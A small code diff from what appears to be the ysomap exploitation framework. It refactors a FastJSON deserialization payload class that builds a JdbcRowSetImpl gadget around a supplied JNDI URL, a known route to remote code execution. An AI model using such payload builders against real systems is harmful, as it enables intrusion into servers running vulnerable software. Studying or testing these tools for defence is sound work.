@@ -3,6 +3,7 @@ package ysomap.payloads.json;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.bullets.json.JdbcRowSetImplJsonBullet;
+import ysomap.core.util.ReflectionHelper;
 
 /**
  * @author wh1t3P1g
@@ -19,7 +20,7 @@ public class FastJSONPayload1 extends FastJsonPayload {
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
         Bullet bullet = new JdbcRowSetImplJsonBullet();
-        bullet.set("jndiURL", args[0]);
+        ReflectionHelper.set(bullet, "jndiURL", args[0]);
         return bullet;
     }
 
